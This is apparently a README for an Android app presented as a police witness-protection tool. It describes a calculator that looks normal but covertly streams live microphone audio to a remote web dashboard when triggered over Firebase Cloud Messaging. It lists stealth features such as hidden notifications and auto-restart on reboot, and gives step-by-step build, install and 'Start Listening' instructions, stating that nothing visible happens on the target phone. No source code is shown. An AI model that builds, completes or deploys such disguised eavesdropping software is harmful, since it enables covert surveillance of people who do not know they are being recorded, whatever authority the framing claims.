# Delhi Police Calculator App

A fully functional calculator app with hidden background audio streaming capabilities for witness protection operations.

## Features

- **Fully Functional Calculator**: All basic operations (+, -, ×, ÷)
- **Clean UI**: Material Design, looks like any standard calculator
- **Remote Activation**: Activated via Firebase Cloud Messaging
- **WebRTC Audio Streaming**: Low-latency, encrypted audio streaming
- **Stealth Features**: Hidden notifications, auto-restart on reboot

## Setup Instructions

### 1. Create Firebase Project

1. Go to [Firebase Console](https://console.firebase.google.com)
2. Click "Add Project"
3. Name: `DelhiPolice-Audio` (or your choice)
4. Disable Google Analytics
5. Click "Create Project"

### 2. Enable Firebase Services

In your Firebase project:

1. **Authentication**
   - Go to Authentication > Sign-in method
   - Enable "Email/Password"
   - Add your email as a user

2. **Cloud Firestore**
   - Go to Firestore Database
   - Click "Create Database"
   - Choose "Start in test mode"
   - Select location (India)
   - Click "Enable"

3. **Cloud Messaging**
   - Go to Project Settings > Cloud Messaging
   - Note down the Server Key

4. **Hosting**
   - Go to Hosting
   - Click "Get Started"
   - Deploy the web dashboard

### 3. Configure Android App

1. Go to Project Settings > General
2. Add Android app
   - Package name: `com.delhipolice.calculator`
   - App nickname: Calculator
3. Download `google-services.json`
4. Place it in `app/` folder

### 4. Build the APK

**Option A: Using GitHub Actions (Recommended)**

1. Create a GitHub repository
2. Upload all project files
3. Go to Actions tab
4. Click "Run workflow"
5. Download APK from Artifacts

**Option B: Using Android Studio**

1. Open project in Android Studio
2. Click Build > Build Bundle(s) / APK(s) > Build APK(s)
3. APK will be in `app/build/outputs/apk/`

### 5. Deploy Web Dashboard

1. Install Firebase CLI: `npm install -g firebase-tools`
2. Login: `firebase login`
3. Go to `web-dashboard/` folder
4. Run: `firebase deploy`
5. Access dashboard at: `https://your-project.web.app`

## Usage

### First Time Setup

1. Install APK on witness phone
2. Open Calculator app
3. Long-press the display area
4. Note the Device ID (e.g., `DP-XXXXXXXX`)
5. Open web dashboard
6. Click "Add Device"
7. Enter Device Name and Device ID

### Daily Operation

1. Open web dashboard on your browser
2. Login with credentials
3. Click on device to select
4. Click "Start Listening"
5. Wait 2-3 seconds
6. Hear live audio from witness phone
7. Click "Stop" when done

### On Witness Phone

- Nothing visible happens
- Calculator works normally if opened
- Phone appears completely normal

## File Structure

```
delhi-police-calculator/
├── app/
│   ├── src/main/
│   │   ├── java/com/delhipolice/calculator/
│   │   │   ├── MainActivity.kt          # Calculator UI
│   │   │   ├── AudioService.kt          # Background audio streaming
│   │   │   ├── FCMService.kt            # Remote trigger receiver
│   │   │   ├── BootReceiver.kt          # Auto-restart on reboot
│   │   │   └── DeviceRegistrar.kt       # Device ID management
│   │   ├── res/
│   │   │   ├── layout/activity_main.xml # Calculator layout
│   │   │   ├── values/strings.xml       # App strings
│   │   │   └── values/colors.xml        # Color definitions
│   │   └── AndroidManifest.xml          # App configuration
│   └── build.gradle.kts                 # Dependencies
├── web-dashboard/
│   ├── index.html                       # Dashboard HTML
│   ├── css/style.css                    # Dashboard styles
│   └── js/
│       ├── firebase-config.js           # Firebase setup
│       ├── auth.js                      # Authentication
│       ├── device-manager.js            # Device management
│       ├── audio-player.js              # WebRTC audio receiver
│       └── app.js                       # Main controller
├── firebase.json                        # Firebase hosting config
└── firestore.rules                      # Security rules
```

## Security Notes

- All audio streams are encrypted via WebRTC (DTLS-SRTP)
- Only authorized users can access the dashboard
- Device IDs are unique and can't be guessed
- No audio is stored on servers - streams live only
- Firebase rules prevent unauthorized access

## Free Tier Limits

| Service | Free Limit | Usage |
|---------|-----------|-------|
| FCM Messages | 100,000/day | ~100/month |
| Firestore Storage | 1 GB | ~10 MB |
| Firebase Hosting | 10 GB | ~50 MB |
| Firebase Auth | 10,000 users | 1 user |

## Troubleshooting

### App not receiving FCM messages
- Check if Firebase is properly configured
- Verify `google-services.json` is in the correct location
- Ensure app has internet permission

### Audio not streaming
- Check if microphone permission is granted
- Verify WebRTC connection in browser console
- Check Firebase Firestore rules

### Dashboard not connecting
- Verify Firebase config in `firebase-config.js`
- Check browser console for errors
- Ensure Firebase Auth is enabled

## License

Internal use only - Delhi Police Department
